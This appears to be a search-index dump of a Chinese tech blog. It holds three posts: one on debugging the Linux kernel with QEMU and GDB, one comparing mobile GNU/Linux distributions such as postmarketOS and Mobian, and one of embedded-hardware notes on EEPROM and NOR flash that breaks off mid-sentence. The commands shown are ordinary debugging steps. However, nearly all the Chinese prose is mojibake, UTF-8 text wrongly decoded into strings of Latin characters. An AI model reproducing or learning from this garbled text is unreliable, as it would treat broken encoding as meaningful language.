¸æ‰€æä¾›çš„æ–‡æ¡£å¦‚ä¸‹ï¼š\nhttps://www.kernel.org/doc/html/latest/dev-tools/gdb-kernel-debugging.html\nå†…æ ¸å¯åŠ¨ å†…æ ¸åˆå§‹åŒ–ä¸»å‡½æ•°ï¼šinit/main.c:start_kernel\n1 2 pwndbg\u0026gt; hb start_kernel pwndbg\u0026gt; c ç¬¬ä¸€æ¬¡å‘consoleæ‰“å°å†…å®¹ï¼š\n1 2 3 pwndbg\u0026gt; hb console_init pwndbg\u0026gt; c pwndbg\u0026gt; until å¯å¾—ï¼š\n1 2 [ 0.000000] Console: colour VGA+ 80x25 [ 0.000000] printk: console [ttyS0] enabled å†…æ ¸ä¸»çº¿ç¨‹çš„ç»ˆç‚¹ï¼š\n1 2 3 4 5 6 7 8 In file: /home/zkv/Laboratory/linux/kernel/sched/idle.c 395 void cpu_startup_entry(enum cpuhp_state state) 396 { 397 arch_cpu_idle_prepare(); 398 cpuhp_online_idle(state); 399 while (1) â–º 400 do_idle(); 401 } è¿›å…¥do_idleè®©å‡ºCPUï¼Œæ²¡æœ‰ä»»åŠ¡æ—¶å°†CPUäº¤ç»™ç”¨æˆ·æ€ç¨‹åºä½¿ç”¨ï¼Œå¦åˆ™å°†CPUé‡æ–°è°ƒåº¦ç»™å†…æ ¸çº¿ç¨‹è‡ªå·±ã€‚while(1)æ— é™å¾ªç¯è¯¥æ“ä½œã€‚\nkernel/sched/idle.cçš„å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 /* * Generic idle loop implementation * * Called with polling cleared. */ static void do_idle(void) { int cpu = smp_processor_id(); /* * Check if we need to update blocked load */ nohz_run_idle_balance(cpu); /* * If the arch has a polling bit, we maintain an invariant: * * Our polling bit is clear if we\u0026#39;re not scheduled (i.e. if rq-\u0026gt;curr != * rq-\u0026gt;idle). This means that, if rq-\u0026gt;idle has the polling bit set, * then setting need_resched is guaranteed to cause the CPU to * reschedule. */ __current_set_polling(); tick_nohz_idle_enter(); while (!need_resched()) { rmb(); local_irq_disable(); if (cpu_is_offline(cpu)) { tick_nohz_idle_stop_tick(); cpuhp_report_idle_dead(); arch_cpu_idle_dead(); } arch_cpu_idle_enter(); rcu_nocb_flush_deferred_wakeup(); /* * In poll mode we reenable interrupts and spin. Also if we * detected in the wakeup from idle path that the tick * broadcast device expired for us, we don\u0026#39;t want to go deep * idle as we know that the IPI is going to arrive right away. */ if (cpu_idle_force_poll || tick_check_broadcast_expired()) { tick_nohz_idle_restart_tick(); cpu_idle_poll(); } else { cpuidle_idle_call(); } arch_cpu_idle_exit(); } /* * Since we fell out of the loop above, we know TIF_NEED_RESCHED must * be set, propagate it into PREEMPT_NEED_RESCHED. * * This is required because for polling idle loops we will not have had * an IPI to fold the state for us. */ preempt_set_need_resched(); tick_nohz_idle_exit(); __current_clr_polling(); /* * We promise to call sched_ttwu_pending() and reschedule if * need_resched() is set while polling is set. That means that clearing * polling needs to be visible before doing these things. */ smp_mb__after_atomic(); /* * RCU relies on this call to be done outside of an RCU read-side * critical section. */ flush_smp_call_function_queue(); schedule_idle(); // è¿™é‡Œä¼šå°†CPUäº¤ç”±ç”¨æˆ·æ€ç¨‹åºä½¿ç”¨ if (unlikely(klp_patch_pending(current))) klp_update_patch_state(current); } ç³»ç»Ÿè°ƒç”¨ é™æ€æœå¯» åŠ¨æ€è°ƒè¯•ç³»ç»Ÿè°ƒç”¨ä»£ç ä¹‹å‰ï¼Œä¸å¦¨å…ˆæ¥æ‰¾åˆ°å†…æ ¸ç³»ç»Ÿè°ƒç”¨çš„é™æ€ä»£ç ä½ç½®ã€‚Linux Kernelä½¿ç”¨SYSCALL_DEFINE[N]å®æ¥å®šä¹‰ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼Œå…¶åŸå‹ä½äºinclude/linux/syscalls.hï¼Œå…¶ä¸­ä¼šè°ƒç”¨ç‰¹å®šç³»ç»Ÿè°ƒç”¨çš„å®ç°å‡½æ•°ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥å¸®åŠ©å¿«é€Ÿç­›é€‰æƒ³è¦åŠ¨æ€è°ƒè¯•çš„ç³»ç»Ÿè°ƒç”¨å…¥å£æ‰€åœ¨ä½ç½®ï¼š\n1 grep -rn \u0026#34;SYSCALL_DEFINE\u0026#34; ä¸¾ä¾‹æ¥è®²ï¼Œæ¥ä¸‹æ¥æˆ‘æƒ³è¦å¯¹ä¸openè¿™ä¸€ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“å®ç°ä¸€æ¢ç©¶ç«Ÿï¼Œå°±åº”å½“ï¼š\n1 2 3 4 â–¶ grep -rn \u0026#34;SYSCALL_DEFINE\u0026#34; | grep open ...... fs/open.c:1331:SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode) ...... å¯çŸ¥ï¼Œopenç³»ç»Ÿè°ƒç”¨çš„å…¥å£ä½äºfs/open.cçš„ç¬¬1331è¡Œï¼š\n1 2 3 4 5 6 SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode) { if (force_o_largefile()) flags |= O_LARGEFILE; return do_sys_open(AT_FDCWD, filename, flags, mode); } ç”±æ­¤è¿›ä¸€æ­¥å¯çŸ¥ï¼Œopenç³»ç»Ÿè°ƒç”¨çš„å®ç°å‡½æ•°ä¸ºdo_sys_openã€‚\nLinux Kernel ç³»ç»Ÿè°ƒç”¨æµç¨‹å‚è§ï¼šhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html\nåŠ¨æ€è°ƒè¯• ç»§ç»­ä»¥openç³»ç»Ÿè°ƒç”¨ä¸ºä¾‹ï¼Œå¼€å§‹åŠ¨æ€è°ƒè¯•è·Ÿè¸ªã€‚\nqemu monitorï¼Œä½ çš„å¥½å¸®æ‰‹ï¼ŒCtrl+A Cè¿›å…¥ä¸é€€å‡ºmonitoræ¨¡å¼ï¼š\nhttps://www.qemu.org/docs/master/system/monitor.html https://en.wikibooks.org/wiki/QEMU/Monitor è¿™é‡Œä½¿ç”¨qemu monitoræ¨¡å¼å¼€å¯è°ƒè¯•ã€‚ä½¿ç”¨qemuå¯åŠ¨å†…æ ¸ï¼š\n1 2 3 4 5 qemu-system-x86_64 -m 512 \\ -kernel arch/x86_64/boot/bzImage \\ -append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ -initrd ramdisk.img \\ -nographic å¯åŠ¨å®Œæˆå¾—åˆ°shellåï¼ŒCtrl+A Cè¿›å…¥ä¸é€€å‡ºmonitoræ¨¡å¼ï¼š\n1 2 3 4 5 6 7 8 9 (initramfs) ls dev bin init lib64 sbin var tmp root conf lib libx32 scripts sys kernel etc lib32 run usr proc # Ctrl+A C (qemu) gdbserver Waiting for gdb connection on device \u0026#39;tcp::1234\u0026#39; # Ctrl+A C (initramfs) ä½¿ç”¨gdbè¿æ¥:1234å³å¯å¼€å§‹è°ƒè¯•ï¼š\n1 gdb vmlinux -ex \u0026#34;target remote :1234\u0026#34; æ­¤å‰å·²ç»çŸ¥é“openç³»ç»Ÿè°ƒç”¨çš„å®ç°å‡½æ•°ä¸ºdo_sys_openï¼Œæ•…äºæ­¤å‡½æ•°ä¸‹æ–­ç‚¹å³å¯ã€‚\nå†…å­˜ç®¡ç† æ–‡ä»¶ç³»ç»Ÿ ç½‘ç»œæ ˆ å®æˆ˜æ¼æ´è°ƒè¯• å‚è§ï¼šhttps://cerr.cc/post/cve-2016-5195-linux-dirtycowæ¼æ´åˆ†æ/\nå‚è€ƒ http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ https://kiprey.github.io/2021/10/kernel_pwn_introduction/ ","date":"2022-08-08T14:17:44+08:00","image":"https://s2.loli.net/2022/08/09/PKcwjiVBTg6ApEv.png","permalink":"https://cerr.cc/post/%E4%BD%BF%E7%94%A8qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/","title":"ä½¿ç”¨QEMU+GDBè°ƒè¯•Linuxå†…æ ¸"},{"content":"å¿«é€’è¿˜åœ¨è·¯ä¸Šâ€¦â€¦ è¯è¯´æˆ‘å¤§å­¦ä¸“ä¸šä¹‹æ‰€ä»¥é€‰äº†è®¡ç®—æœºï¼Œé™¤å»é«˜äºŒäºå­¦éœ¸æœ¬è”æƒ³G510ä¸Šç©è¿‡ã€Šçœ‹é—¨ç‹—ã€‹çš„åŸå› å¤–ï¼Œå°±æ˜¯å› ä¸ºæœ‰ç€æŠ˜è…¾äºŒæ‰‹å®‰å“æœºçš„çˆ±å¥½äº†ã€‚è¿™ä¸€å…´è¶£ä¸€ç›´å»¶ç»­åˆ°äº†å¤§å­¦ï¼Œä»¥è‡³äºæˆ‘ç«¥åŸæ— æ¬ºçš„é—²é±¼è´¦å·è¢«äººæ€€ç–‘ä¸ºæ˜¯æœºè´©å­è´¦å· ï¼ˆğŸ˜¤æ˜¯å¯å¿ï¼Œå­°ä¸å¯å¿ï¼‰ ã€‚ç›´è‡³å¤§ä¸‰å¼€å§‹æåˆ°äº†å¤–å¿«ï¼Œå¯ä»¥ä¸å†ä¸ºä¸€å°å¤šæ¬¡æ˜“ä¸»çš„è®¾å¤‡åœ¨ç»æµä¸Šç²¾æ‰“ç»†ç®—ï¼Œä¾¿æ¸æ¸å¤±å»äº†å¾€æ—¥çš„æ¿€æƒ…ã€‚æœç„¶å¤ªå®¹æ˜“å¾—åˆ°çš„ä¸œè¥¿ï¼Œå°±ä¼šå¤±å® ã€‚\nè¿˜è®°å¾—å¤§äºŒé‚£æ¬¡Essential Phoneæ¢LG V30çš„äº¤æ˜“ï¼Œåœ¨æˆ‘å’Œé‚£ä½å°ç±³å‰å‘˜å·¥çº¦å®šçš„åœ°é“ç«™å†…ï¼Œä»–è¯´ï¼Œä»æˆ‘èº«ä¸Šä»¿ä½›çœ‹è§äº†å½“å¹´çš„ä»–ï¼Œä¸ºä¸€å°å¿ƒå¿ƒå¿µå¿µçš„ç ´æ—§è®¾å¤‡å¥”æ³¢å‡ åé‡Œå´æ»¡å¿ƒæ¬¢å–œã€‚ä¸¤ååƒæœºä½¬ç›¸è§†ä¸€ç¬‘ï¼Œå¿ƒç…§ä¸å®£ï¼Œä½ ä¸œæˆ‘è¥¿ï¼Œä»æ­¤å†æ— äº¤é›†â€¦â€¦ï¼ˆğŸ˜­\nLinux On a Phone å•¥è¯´æ˜¯æ‰‹æœºä¸Šçš„Linuxï¼Ÿå®‰å“çš„å†…æ ¸æœ¬æ¥å°±æ˜¯Linuxå‘€ï¼Ÿï¼\nä½†é‚£æ˜¯Android/Linuxï¼Œè€Œæˆ‘ä»¬æœ¬æ¬¡çš„ç›®æ ‡æ˜¯GNU/Linuxï¼Œå°†mainline kernelä¸GNU utilsè¿è¡Œä¸æ‰‹æœºä¹‹ä¸Šã€‚å¯ä»¥æ¯”å–»æˆå°†æ‰‹æœºåˆ·æˆäº†ä¸€å°è¿è¡Œäº†æ¡Œé¢çº§ç³»ç»Ÿçš„å°ä¸»æœºï¼Ÿ\nå…³äºAndroidçš„Linuxå†…æ ¸ä¸mainline Linuxå†…æ ¸çš„å…³ç³»ï¼Œå‚è§Googleçš„è¯´æ˜ï¼šhttps://source.android.com/devices/architecture/kernel?hl=zh-cn\næœ‰è‹¥å¹²é¡¹ç›®è¯•å›¾æ¥è¿‘è¿™ä¸ªç›®æ ‡ï¼Œå…¶ä¸­æœ€æœ‰åçš„åº”è¯¥è¿˜æ˜¯Ubuntu Touchäº†ã€‚ä½†ç»è¿‡ä¸€äº›è°ƒç ”åï¼Œæˆ‘å‘ç°Ubuntu Touchå¹¶ä¸æ˜¯æˆ‘æ»¡æ„çš„é€‰æ‹©â€¦â€¦\nUbuntu Touch https://ubuntu-touch.io/\nUbuntu Touchå€ŸåŠ©äº†Haiumä»¥è§£å†³çº·ç¹å¤æ‚çš„ç¡¬ä»¶é©±åŠ¨æ”¯æŒé—®é¢˜ï¼Œè™½ç„¶ç”±æ­¤è¾¾æˆäº†å°†GNU utilsæ— ç¼è¿è¡Œäºç§»åŠ¨è®¾å¤‡çš„ç›®çš„ï¼Œä½†å´ä¹Ÿå› æ­¤è¢«è¿«èˆå¼ƒäº†mainline kernelã€‚å…·ä½“æŠ€æœ¯æ¶æ„å‚è§https://halium.org/å³å¯ã€‚\nä¼¼ä¹Ubuntu Touchçš„å®šä½ä¸»è¦ç„å‡†äº†Androidï¼Œè€Œéä½œä¸ºä¸€ä¸ªå®Œå…¨å¯å®šåˆ¶çš„æå®¢OSï¼Œæ‰€ä»¥åœ¨åŒ…ç®¡ç†ã€åˆ†åŒºè¯»å†™ç­‰æ–¹é¢å¹¶ä¸èƒ½åšåˆ°å¦‚åŒUbuntu desktopä¸€æ ·çš„ä½“éªŒã€‚å†åŠ ä¸Šå…¶æ²¡æœ‰ä½¿ç”¨mainline kernelä¸ç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œæ•…è€Œå¼ƒä¹‹ã€‚\nMobian https://mobian.org/\nhttps://wiki.mobian.org/\nMobianï¼Œå³mobile debianï¼Œå¥½çš„åœ°æ–¹åœ¨äºå…¶å·²ä¸ºå¤§å®¶å¹¿æ³›ç†Ÿæ‚‰çš„apt+dpkgåŒ…ç®¡ç†å·¥å…·å’Œè½¯ä»¶æºï¼Œä¸”å…¶ä½¿ç”¨äº†mainlineå†…æ ¸ã€‚ä½†ç¼ºä¹å¯¹äºå¤§é‡è®¾å¤‡çš„æ”¯æŒã€‚Mobiançš„è®¾å¤‡æ”¯æŒåˆ—è¡¨åœ¨è¿™é‡Œï¼šhttps://wiki.mobian.org/doku.php?id=devicesã€‚å¯ä»¥çœ‹åˆ°é™¤å»å‡ æ¬¾å›½å†…éš¾ä»¥è´­ä¹°ã€ä»·æ ¼é«˜æ˜‚ã€é…ç½®ä½ä¸‹çš„å¼€æºæ‰‹æœºå¤–ï¼Œå°±åªæœ‰ä¸€åŠ 6å’Œå°ç±³Pocophone F1ä¸¤æ¬¾éªé¾™845æœºå‹äº†ã€‚\nDroidian https://droidian.org/\nMobiançš„Haiumç‰ˆæœ¬ï¼Œå€Ÿç”±å’ŒUbuntu Touchç±»ä¼¼çš„æ–¹æ¡ˆï¼Œè¾¾æˆæ”¯æŒæ›´å¤šè®¾å¤‡çš„ç›®çš„ã€‚ä½†ä¹Ÿå› æ­¤æ”¾å¼ƒäº†mainline kernelã€‚\npostmarketOS https://postmarketos.org/\npostmarketOSåŸºäºAlpine Linuxï¼Œä¸ºbusybox + musl libcçš„è§£å†³æ–¹æ¡ˆã€‚åœ¨é‡‡ç”¨mainline kernelçš„mobileå‘è¡Œç‰ˆä¸­ç¤¾åŒºæœ€å¤§ï¼Œç»´æŠ¤æœ€æ´»è·ƒã€‚å…¶æ”¯æŒçš„è®¾å¤‡åˆ—è¡¨ä¸æ”¯æŒæƒ…å†µå¯ä»¥äºæ­¤æŸ¥åˆ°ï¼šhttps://wiki.postmarketos.org/wiki/Devices\nä»¥æˆ‘æ‰‹ä¸Šçš„Xiaomi Mi Note2ä¸ºä¾‹ï¼Œå¯¹å…¶çš„è®¸å¤šé©±åŠ¨æ”¯æŒæ˜¯postmarketOSç‹¬ä¸€ä»½çš„ï¼Œæ¯”å¦‚æ­¤å‰ä¿®å¤çš„Wi-Fiæ¨¡å—ï¼šhttps://gitlab.com/postmarketOS/pmaports/-/merge_requests/3271\npostmarketOSé›†æˆäº†å‡ ä¹æ‰€æœ‰ä¸ºmobileç”Ÿæ€åšå‡ºåŠªåŠ›çš„ä¸Šå±‚æ¡Œé¢ç¯å¢ƒï¼šhttps://wiki.postmarketos.org/wiki/Category:Interfaceã€‚ä¸”ä¸è½¯ä»¶æºä¸­æä¾›äº†ä¸€é”®å®‰è£…ä¸åˆ‡æ¢ã€‚ä¸åŒè®¾å¤‡æ‰€é€‚åˆçš„DEå¹¶ä¸åŒï¼Œæˆ‘æ­¤å‰çš„Xiaomi Redmi2ä½¿ç”¨KDE Plasma mobileæœ€èˆ’é€‚ï¼Œè€Œç°åœ¨æ‰‹ä¸Šè¿™å°Xiaomi Mi Note2è¿è¡ŒPhoshæ‰æœ€ç¨³å®šã€‚\nå…¶äº¦æœ‰å›½å†…è½¯ä»¶æºé•œåƒçš„æ”¯æŒï¼šhttps://mirrors.tuna.tsinghua.edu.cn/postmarketOS/\næ¢æºè¯´æ˜ï¼šhttps://mirrors.tuna.tsinghua.edu.cn/help/postmarketOS/\nå°†è½¯ä»¶æºç”±ç‰¹å®šå‘è¡Œç‰ˆåˆ‡æ¢åˆ°masteråˆ†æ”¯åï¼Œå³ç›¸å½“äºå°†ç³»ç»Ÿè½¬åŒ–ä¸ºæ»šåŠ¨æ›´æ–°æ¨¡å¼ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œæ˜¨å¤©ä¸ŠæŠ¥çš„bugå¯èƒ½ä»Šå¤©å°±è¢«ä¿®å¤äº†ï¼Œä¸‹æ¸¸è®¾å¤‡ç«‹å³æ‰§è¡Œapk update; apk upgradeå³å¯ç«‹å³è·å–ä¿®å¤çš„æ›´æ–°ã€‚ç¼ºç‚¹åˆ™æ˜¯æ˜¯masteråˆ†æ”¯çš„ä¸ç¨³å®šã€‚ä½†è€ƒè™‘åˆ°mobileå‘è¡Œç‰ˆçš„å¯ç”¨æ€§ä¸ç¨³å®šæ€§æœ¬èº«å°±å ªå¿§ï¼Œåˆ‡æ¢è‡³æ»šåŠ¨æ›´æ–°ï¼Œæˆ–è®¸æ˜¯ç‰ºç‰²1ä»½ç¨³å®šæ€§ï¼Œæ¢å–5åˆ†å¯ç”¨æ€§ã€‚åœ¨æˆ‘çœ‹æ¥æ˜¯å¾ˆåˆ’ç®—çš„ç”Ÿæ„ã€‚\nå…¶ä½™æš‚æœªè¿›ä¸€æ­¥äº†è§£çš„Mobile Distros Sailfish OS https://sailfishos.org/\nä½“é‡è²Œä¼¼ä¹Ÿå¾ˆå¤§ï¼Œä½†å…¶å®˜ç½‘é¦–é¡µå°±æ˜¯æ ‡ä»·ï¼Œé¢„æ„Ÿä¸å¦™ï¼Œé€ƒâ€¦â€¦\nLuneOS http://www.webos-ports.org/wiki/Main_Page\nä¹Ÿæ˜¯Haiumæ–¹æ¡ˆã€‚\nPureOSã€Manjaro ARMç­‰ https://pureos.net/\nhttps://manjaro.org/\nå…¶å®šä½å¹¶éä¸ºç§»åŠ¨ç«¯åŠªåŠ›ã€‚åªèƒ½è¯´æ˜¯æ”¯æŒäº†Pine Phoneç­‰å¼€æºæ‰‹æœºè€Œå·²ã€‚\nå…³äºåˆ·æœº å‚è€ƒhttps://cerr.cc/post/androidææœºç¬”è®°/\nXiaomi Mi Note2 ","date":"2022-07-19T10:50:06+08:00","image":"https://postmarketos.org/static/img/nexus5-bg-dark.jpg","permalink":"https://cerr.cc/post/%E6%89%8B%E6%9C%BA%E5%8F%98%E8%BA%AB%E5%B0%8F%E4%B8%BB%E6%9C%BA/","title":"æ‰‹æœºå˜èº«å°ä¸»æœºï¼Ÿï¼"},{"content":" ç‰©è”ç½‘å®‰å…¨æ˜¯ç¦»ä¸å¼€ç¡¬ä»¶é¢†åŸŸçš„ã€‚è€Œè®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ä¸“ä¸šå‡ºèº«çš„æˆ‘ï¼ŒåµŒå…¥å¼çŸ¥è¯†å®å±åŒ®ä¹ã€‚å…¬å¸ç»„å†…æœ‰å¤§é‡å…è´¹ç©å…·å´ä¸ä¼šç©ï¼Œè¿™å£æ°”å®åœ¨éš¾ä»¥ä¸‹å’½ã€‚æ¥ä¸‹æ¥æ˜¯å¯¹è‡ªå·±åµŒå…¥å¼ç¡¬ä»¶çŸ¥è¯†çš„æ—©æ•™è®°å½•ã€‚\nPCB https://en.wikipedia.org/wiki/Printed_circuit_board\nå¤„ç†å™¨ MCU https://en.wikipedia.org/wiki/Microcontroller STM32 https://en.wikipedia.org/wiki/STM32 IICEEPROM IICEEPROMï¼Œé‡‡ç”¨çš„æ˜¯IICé€šä¿¡åè®®ã€‚\nIICé€šä¿¡åè®®å…·æœ‰çš„ç‰¹ç‚¹ï¼šç®€å•çš„ä¸¤æ¡æ€»çº¿çº¿è·¯ï¼Œä¸€æ¡ä¸²è¡Œæ•°æ®çº¿ï¼ˆSDAï¼‰ï¼Œä¸€æ¡ä¸²è¡Œæ—¶é’Ÿçº¿ï¼ˆSCLï¼‰ï¼›ä¸²è¡ŒåŠåŒå·¥é€šä¿¡æ¨¡å¼çš„8ä½åŒå‘æ•°æ®ä¼ è¾“ï¼Œä½é€Ÿç‡æ ‡å‡†æ¨¡å¼ä¸‹å¯è¾¾100Kbit/sï¼›ä¸€ç§ç”µå¯æ“¦é™¤å¯ç¼–ç¨‹åªè¯»å­˜å‚¨å™¨ï¼Œæ‰ç”µåæ•°æ®ä¸ä¸¢å¤±ï¼Œç”±äºèŠ¯ç‰‡èƒ½å¤Ÿæ”¯æŒå•å­—èŠ‚æ“¦å†™ï¼Œä¸”æ”¯æŒæ“¦é™¤çš„æ¬¡æ•°éå¸¸ä¹‹å¤šï¼Œä¸€ä¸ªåœ°å€ä½å¯é‡å¤æ“¦å†™çš„ç†è®ºå€¼ä¸º100ä¸‡æ¬¡ï¼Œå¸¸ç”¨èŠ¯ç‰‡å‹å·æœ‰AT24C02ã€FM24C02ã€CAT24C02ç­‰ï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºDIP8ï¼ŒSOP8ï¼ŒTSSOP8ç­‰ã€‚\nFlash https://en.wikipedia.org/wiki/Flash_memory https://nieyong.github.io/wiki_ny/Flash.html åœ¨åµŒå…¥å¼è®¾å¤‡ä¸­ï¼Œç”±äºå…¶å­˜å‚¨çš„ç®€ä¾¿æ€§å’Œå°ç©ºé—´ã€é«˜åˆ©ç”¨ç‡ã€é«˜ç¨³å®šæ€§ç­‰éœ€æ±‚ï¼Œè¦æ±‚ä¸€ç§ç‰¹æ®Šçš„å­˜å‚¨ä»‹è´¨æ¥å­˜å‚¨åµŒå…¥å¼å›ºä»¶ã€‚åœ¨è¿‡å»çš„åµŒå…¥å¼è®¾å¤‡ä¸­ï¼ŒEPROMå’ŒEEPROMæ˜¯å­˜å‚¨ä»‹è´¨çš„ä¸»æµäº§å“ï¼Œè€Œç›®å‰flashå­˜å‚¨ä»‹è´¨å·²ç»å æ®äº†åµŒå…¥å¼å­˜å‚¨å¸‚åœºçš„ä¸»æµã€‚æŒ‰ç…§å…¶å†…éƒ¨æ¶æ„å’Œå®ç°æŠ€æœ¯ä¸»è¦åˆ†ANDã€NANDã€NORã€DiNORå››ç§ï¼Œå…¶ä¸­NORå’ŒNANDä¸ºflashçš„ä¸»æµäº§å“ã€‚\nå›ºä»¶å­˜å‚¨ä»‹è´¨å…·æœ‰è‡ªèº«çš„æ•°æ®å­˜å‚¨ã€è®¿é—®æœºåˆ¶ï¼Œç”¨æˆ·å¯¹æ•°æ®çš„è®¿é—®ä¹Ÿéœ€è¦ä¸€å¥—æœºåˆ¶ã€‚ä¸ºäº†å®ç°ä¸Šå±‚å¯¹æ•°æ®è®¿é—®çš„æœ‰æ•ˆæ€§å’Œé€æ˜æ€§ï¼Œåº•å±‚çš„å­˜å‚¨æœºåˆ¶å’Œä¸Šå±‚çš„è®¿é—®æœºåˆ¶ä¹‹é—´å°±éœ€è¦ä¸€ä¸ªæ¥å£ï¼Œè¿™å°±æ˜¯å­˜å‚¨æŠ€æœ¯é©±åŠ¨ç¨‹åºï¼ˆMTDï¼‰ã€‚é©±åŠ¨ç¨‹åºç”¨æ¥å®ç°å¯¹å­˜å‚¨å•å…ƒçš„ç®¡ç†ï¼Œå®ç°ç”±é€»è¾‘ç»“æ„åˆ°ç‰©ç†ç»“æ„æ“ä½œçš„é€æ˜æ˜ å°„ï¼ŒåŒæ—¶ä¹ŸåŒ…æ‹¬åå—å¤„ç†ã€æŸè€—å¹³è¡¡ç­‰ã€‚\nNOR Flash NORflashåŸºæœ¬æ“ä½œçš„æœ€å°å•ä½ä¸ºå—ï¼Œå¤§å°ä¸º64K-256Kå­—èŠ‚ï¼Œä¸€èˆ¬æ˜¯128Kå­—èŠ‚ã€‚æ¯ä¸ªå—é¦–éƒ¨æœ‰è®°å½•ä¿¡æ¯ï¼Œå…¶ä½™éƒ¨åˆ†åˆå¯åˆ’åˆ†ä¸ºå¤šä¸ªæ‰‡åŒºï¼Œæ¯ä¸ªæ‰‡åŒºçš„å¤§å°ä¸€èˆ¬ä¸º512å­—èŠ‚ã€‚NORflashç”±äºå…·æœ‰ç‰‡å†…æ‰§è¡ŒåŠŸèƒ½ï¼ˆXIPï¼‰ï¼Œæ‰€ä»¥ç»å¸¸ç”¨åœ¨æ•°æ®å¤„ç†æ¨¡å—ã€‚ç”±äºä»·æ ¼æ¯”è¾ƒæ˜‚è´µï¼Œä½“ç§¯è¾ƒå¤§ï¼Œæ‰€ä»¥å­˜å‚¨é‡ä¹Ÿç›¸å¯¹è¾ƒå°ï¼Œä¸€èˆ¬æ¥è¯´NORçš„å®¹é‡åœ¨1Må­—èŠ‚åˆ°32Må­—èŠ‚ä¹‹é—´ã€‚\nNORflashæ˜¯ä¸€ä¸ªç±»ä¼¼äºRAMçš„éšæœºè®¿é—®å­˜å‚¨è®¾å¤‡ã€‚å…¶åœ°å€å¼•è„šå¯ä»¥æ˜ å°„åˆ°å­˜å‚¨ä»‹è´¨çš„æ•´ä¸ªåŒºé—´ï¼Œå¹¶éšæœºè®¿é—®å…¶ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚ã€‚NORflashè¯»å†™æ“ä½œä¸€èˆ¬é‡‡ç”¨512å­—èŠ‚çš„å—ã€‚ä¸ºäº†é™ä½è´¹ç”¨ã€å…‹æœä¸€äº›ç‰©ç†æ–¹é¢çš„é™åˆ¶ï¼Œflashå­˜å‚¨è®¾å¤‡è¢«åˆ†ä¸ºå¤šä¸ªå—ã€‚æ•°æ®çš„å†™å…¥æ˜¯ä»¥å—ä¸ºå•ä½çš„ï¼Œåœ¨å†™å…¥æ•°æ®å—ä¹‹å‰å¿…é¡»å¯¹ç›¸åº”çš„å—è¿›è¡Œæ“¦é™¤ã€‚NORflashåœ¨å—æ“¦é™¤ä¹‹å‰å¿…é¡»æŠŠå—ä¸­æ‰€æœ‰çš„å­˜å‚¨ä½ç½®0ï¼Œæ¯æ¬¡æ“¦é™¤çš„å®¹é‡ä»¥64-128KBçš„å—ä¸ºå•ä½ï¼Œå¯¼è‡´æ•°æ®å†™å…¥è¿‡ç¨‹ä¸­è€—æ—¶è¾ƒé•¿ï¼Œå—æ“¦é™¤çš„æ—¶é—´å¤§çº¦ä¸º5sã€‚NORflashå…·æœ‰ç‰‡å†…æ‰§è¡ŒåŠŸèƒ½ï¼ˆXIPï¼‰ï¼Œè€Œä¸”è¿˜å…·æœ‰è¾ƒé«˜çš„è¯»é€Ÿåº¦ã€‚ä½†æ˜¯å®ƒçš„å­˜å‚¨ç©ºé—´è¾ƒå°ï¼Œè€Œä¸”å†™é€Ÿåº¦å’Œæ“¦é™¤é€Ÿåº¦è¾ƒæ…¢ã€‚ä¸€èˆ¬ç”¨æ¥å­˜å‚¨ç‰‡å†…æ‰§è¡Œç¨‹åºã€‚\nNORFlashæœ‰å¹¶è¡Œå’Œä¸²è¡Œä¸¤ç§ï¼Œä¸²è¡Œä¸€èˆ¬æ˜¯SOPå°è£…ï¼Œä½¿ç”¨SPIåè®®ã€‚å¹¶è¡Œåªæœ‰æå°‘æ•°BGAå°è£…ï¼Œä¸€èˆ¬æ˜¯TSOPå°è£…ï¼ŒTSOP-56,TFBGA-56,LFBGA-64ã€‚\nNORFlashæ”¯æŒéšæœºè®¿é—®ï¼Œå› æ­¤æ“¦é™¤å•ä½æ˜¯Byteã€‚è¿™é‡ŒæŒ‡çš„æ˜¯å¹¶è¡Œä¿¡å·å¼•è„šï¼ŒNORçš„ä¿¡å·çº¿å’ŒSRAMåŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ã€‚å¦‚æœé£çº¿ä¼šç‰¹åˆ«éº»çƒ¦ã€‚\nSPINorFlash SPINorFlashï¼Œé‡‡ç”¨çš„æ˜¯SPIé€šä¿¡åè®®ã€‚æœ‰4çº¿ï¼ˆæ—¶é’Ÿï¼Œä¸¤ä¸ªæ•°æ®çº¿ï¼Œç‰‡é€‰çº¿ï¼‰æˆ–è€…3çº¿ï¼ˆæ—¶é’Ÿï¼Œä¸¤ä¸ªæ•°æ®çº¿ï¼‰é€šä¿¡æ¥å£ï¼Œç”±äºå®ƒæœ‰ä¸¤ä¸ªæ•°æ®çº¿èƒ½å®ç°å…¨åŒå·¥é€šä¿¡ï¼Œå› 